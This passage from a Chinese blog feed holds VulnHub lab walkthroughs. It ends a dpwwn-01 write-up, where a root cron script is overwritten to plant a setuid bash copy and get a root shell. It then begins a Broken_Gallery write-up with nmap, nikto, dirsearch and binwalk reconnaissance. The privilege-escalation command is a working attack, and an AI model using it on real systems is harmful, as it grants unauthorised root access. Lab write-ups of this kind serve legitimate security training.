- 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name  command to be executed</span><br><br>*/3 *  * * *  root  /home/mistic/logrot.sh<br></code></pre></td></tr></table></figure><p>那接下来就简单了，可以把 bash 复制出来然后赋予 s 权限，也可以把当前用户加入 sudoer</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">[mistic@dpwwn-01 ~]$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&quot;</span> &gt; logrot.sh <br>[mistic@dpwwn-01 ~]$ <span class="hljs-built_in">cat</span> logrot.sh <br><span class="hljs-built_in">cp</span> /bin/bash /tmp/bash; <span class="hljs-built_in">chmod</span> +s /tmp/bash<br>[mistic@dpwwn-01 ~]$ <span class="hljs-built_in">cd</span> /tmp<br>[mistic@dpwwn-01 tmp]$ ll<br>total 900<br>-rwsr-sr-x. 1 root root 918400 Jun 27 02:54 bash<br>drwx------. 3 root root     17 Jun 26 22:55 systemd-private-53b92180216b468cb1083272653633e5-chronyd.service-aSeucn<br>drwx------. 3 root root     17 Jun 26 22:56 systemd-private-53b92180216b468cb1083272653633e5-httpd.service-D495YP<br>drwx------. 3 root root     17 Jun 26 22:56 systemd-private-53b92180216b468cb1083272653633e5-mariadb.service-0VDwAm<br>drwx------. 3 root root     17 Jun 27 02:42 systemd-private-ee4d9ae84e8a4c878ca61f256dda3329-chronyd.service-abFUnb<br>drwx------. 3 root root     17 Jun 27 02:42 systemd-private-ee4d9ae84e8a4c878ca61f256dda3329-httpd.service-xbcok8<br>drwx------. 3 root root     17 Jun 27 02:42 systemd-private-ee4d9ae84e8a4c878ca61f256dda3329-mariadb.service-m3bA7F<br>[mistic@dpwwn-01 tmp]$ ./bash -p<br>bash-4.2<span class="hljs-comment"># whoami</span><br>root<br>bash-4.2<span class="hljs-comment"># id</span><br>uid=1000(mistic) gid=1000(mistic) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),1000(mistic) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023<br>bash-4.2<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:74:f0:06 brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.142/24 brd 192.1.1.255 scope global noprefixroute dynamic ens33<br>       valid_lft 1336sec preferred_lft 1336sec<br>    inet6 fe80::20c:29ff:fe74:f006/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Broken_Gallery 靶机</title>
    <link href="/2023/06/909fcb140cd3.html"/>
    <url>/2023/06/909fcb140cd3.html</url>
    
    <content type="html"><![CDATA[<h1 id="Broken-Gallery-靶机"><a href="#Broken-Gallery-靶机" class="headerlink" title="Broken_Gallery 靶机"></a>Broken_Gallery 靶机</h1><blockquote><p>vulnhub 靶机，要绝处逢生，需要勇气和信心，来挑战吧！枚举和信息收集阶段干扰信息不多，但会一度陷入僵局，没有二进制的经验，会无从下手，那个小节对你来说未必不是挑战，用不到太多二进制的东西，但需要你会你才能建立信心，小技巧走一波才能获得立足点。提权只要知道 gtfobins 就应该不难了，难在具备总结经验，触类旁通等能力。靶机不算特别初级，有一点点难度。——红队笔记UP</p></blockquote><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.141                            <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 04:56 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.141<br>Host is up (0.00047s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:3B:1C:1C (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.56 seconds<br></code></pre></td></tr></table></figure><p>开放了两个端口 80 和 22，进行版本和系统探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -sC -p22,80 192.1.1.141                           <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 04:57 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.141<br>Host is up (0.00021s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 39:5e:bf:8a:49:a3:13:fa:0d:34:b8:db:26:57:79:a7 (RSA)<br>|   256 20:d7:72:be:30:6a:27:14:e1:e6:c2:16:7a:40:c8:52 (ECDSA)<br>|_  256 84:a0:9a:59:61:2a:b7:1e:<span class="hljs-built_in">dd</span>:6e:da:3b:91:f9:a0:c6 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.18<br>|_http-title: Index of /<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>| http-ls: Volume /<br>| SIZE  TIME              FILENAME<br>| 55K   2019-08-09 01:20  README.md<br>| 1.1K  2019-08-09 01:21  gallery.html<br>| 259K  2019-08-09 01:11  img_5terre.jpg<br>| 114K  2019-08-09 01:11  img_forest.jpg<br>| 663K  2019-08-09 01:11  img_lights.jpg<br>| 8.4K  2019-08-09 01:11  img_mountains.jpg<br>|_<br>MAC Address: 00:0C:29:3B:1C:1C (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.62 seconds<br></code></pre></td></tr></table></figure><p>Ubuntu 操作系统，80 端口下是几个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --top-ports 20 -sU 192.1.1.141                              <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 04:57 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.141<br>Host is up (0.00019s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   closed        snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   open|filtered ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 00:0C:29:3B:1C:1C (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 24.33 seconds<br></code></pre></td></tr></table></figure><p>UDP 扫描没有很有价值的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Broken_Gallery]<br>└─$ sudo nmap --script=vuln -p22,80 192.1.1.141                           <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 06:37 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.141<br>Host is up (0.00015s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server\<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /: Root directory w/ listing on &#x27;</span>apache/2.4.18 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-sql-injection: <br>|   Possible sqli <span class="hljs-keyword">for</span> queries:<br>|     http://192.1.1.141:80/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=D%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=M%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.1.1.141:80/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|_    http://192.1.1.141:80/?C=M%3BO%3DA%27%20OR%20sqlspider<br>MAC Address: 00:0C:29:3B:1C:1C (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 322.34 seconds<br></code></pre></td></tr></table></figure><p>nmap 漏洞脚本扫描也没什么有价值的信息，尝试一下nikto</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nikto -h http://192.1.1.141/       <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          192.1.1.141<br>+ Target Hostname:    192.1.1.141<br>+ Target Port:        80<br>+ Start Time:         2023-06-26 06:20:01 (GMT-4)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.18 (Ubuntu)<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ /: Directory indexing found.<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="hljs-keyword">for</span> the 2.x branch.<br>+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .<br>+ /./: Directory indexing found.<br>+ /./: Appending <span class="hljs-string">&#x27;/./&#x27;</span> to a directory allows indexing.<br>+ //: Directory indexing found.<br>+ //: Apache on Red Hat Linux release 9 reveals the root directory listing by default <span class="hljs-keyword">if</span> there is no index page.<br>+ /%2e/: Directory indexing found.<br>+ /%2e/: Weblogic allows <span class="hljs-built_in">source</span> code or directory listing, upgrade to v6.0 SP1 or higher. See: http://www.securityfocus.com/bid/2513<br>+ ///: Directory indexing found.<br>+ /?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via <span class="hljs-string">&#x27;open directory browsing&#x27;</span>. Web Publisher should be disabled. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269<br>+ /?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via <span class="hljs-string">&#x27;open directory browsing&#x27;</span>. Web Publisher should be disabled. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269<br>+ ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.<br>+ ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when multiple /<span class="hljs-string">&#x27;s are requested. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1078</span><br><span class="hljs-string">+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/</span><br><span class="hljs-string">+ /README.md: Readme Found.</span><br><span class="hljs-string">+ 8074 requests: 0 error(s) and 18 item(s) reported on remote host</span><br><span class="hljs-string">+ End Time:           2023-06-26 06:20:14 (GMT-4) (13 seconds)</span><br><span class="hljs-string">---------------------------------------------------------------------------</span><br><span class="hljs-string">+ 1 host(s) tested</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>Allowed HTTP Methods: OPTIONS, GET, HEAD, POST。没有 PUT 方法，没办法上传文件，尝试目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads]<br>└─$ sudo dirsearch -u http://192.1.1.141/ -r<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.1.1.141/-_23-06-26_07-55-16.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-06-26_07-55-16.<span class="hljs-built_in">log</span><br><br>Target: http://192.1.1.141/<br><br>[07:55:16] Starting: <br>[07:55:17] 403 -  297B  - /.ht_wsr.txt                                     <br>[07:55:17] 403 -  301B  - /.htaccess_extra<br>[07:55:17] 403 -  300B  - /.htaccess.save<br>[07:55:17] 403 -  300B  - /.htaccess.orig<br>[07:55:17] 403 -  300B  - /.htaccess.bak1<br>[07:55:17] 403 -  300B  - /.htaccess_orig<br>[07:55:17] 403 -  302B  - /.htaccess.sample<br>[07:55:17] 403 -  298B  - /.htaccessBAK<br>[07:55:17] 403 -  299B  - /.htaccessOLD2<br>[07:55:17] 403 -  298B  - /.htaccess_sc<br>[07:55:17] 403 -  298B  - /.htaccessOLD<br>[07:55:17] 403 -  291B  - /.html                                           <br>[07:55:17] 403 -  290B  - /.htm<br>[07:55:17] 403 -  300B  - /.htpasswd_test<br>[07:55:17] 403 -  296B  - /.htpasswds<br>[07:55:17] 403 -  297B  - /.httr-oauth<br>[07:55:19] 200 -   55KB - /README.md                                        <br>[07:55:30] 200 -    1KB - /gallery.html                                     <br>[07:55:39] 403 -  299B  - /server-status                                    <br>[07:55:39] 403 -  300B  - /server-status/     (Added to queue)              <br>[07:55:44] Starting: server-status/                                          <br>[07:55:44] 404 -  285B  - /server-status/%2e%2e//google.com<br>                                                                             <br>Task Completed <br></code></pre></td></tr></table></figure><p>得到的两个有效结果实际上都是 80 端口下可见的文件，目录爆破也没什么新的东西，那就把关注点放在 80 端口下的几个文件吧</p><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p><img src="/pic/4ad4dde687a7d68e4c606b90ca22803c_MD5.png"></p><p>把文件都下载到本地，然后看看是否有隐写的信息，分别使用 <code>file</code>，<code>binwalk</code>，<code>exiftool</code> 和 <code>strings</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Broken_Gallery]<br>└─$ file *          <br>img_5terre.jpg:    JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, progressive, precision 8, 1200x900, components 3<br>img_forest.jpg:    JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, progressive, precision 8, 750x425, components 3<br>img_lights.jpg:    JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 2988x1680, components 3<br>img_mountains.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 314x160, components 3<br>README.md:         CSV text<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Broken_Gallery]<br>└─$ binwalk *             <br><br>Scan Time:     2023-06-26 05:05:26<br>Target File:   /home/kali/Downloads/Broken_Gallery/img_5terre.jpg<br>MD5 Checksum:  5d37289a16584a465eaacb52e58521d4<br>Signatures:    411<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             JPEG image data, JFIF standard 1.01<br><br><br>Scan Time:     2023-06-26 05:05:26<br>Target File:   /home/kali/Downloads/Broken_Gallery/img_forest.jpg<br>MD5 Checksum:  761a639a8a0e2ddac1818348eba4bc3d<br>Signatures:    411<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             JPEG image data, JFIF standard 1.01<br><br><br>Scan Time:     2023-06-26 05:05:26<br>Target File:   /home/kali/Downloads/Broken_Gallery/img_lights.jpg<br>MD5 Checksum:  dc0703a8dd937fae387b639dc73827c1<br>Signatures:    411<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             JPEG image data, JFIF standard 1.01<br><br><br>Scan Time:     2023-06-26 05:05:26<br>Target File:   /home/kali/Downloads/Broken_Gallery/img_mountains.jpg<br>MD5 Checksum:  8412b3da2a31506bb24050ba8cf6d413<br>Signatures:    411<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             JPEG image data, JFIF standard 1.01<br><br><br>Scan Time:     2023-06-26 05:05:26<br>Target File:   /home/kali/Downloads/Broken_Gallery/README.md<br>MD5 Checksum:  db082d3bc4489f6fd9258b79154b0965<br>Signatures:    411<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 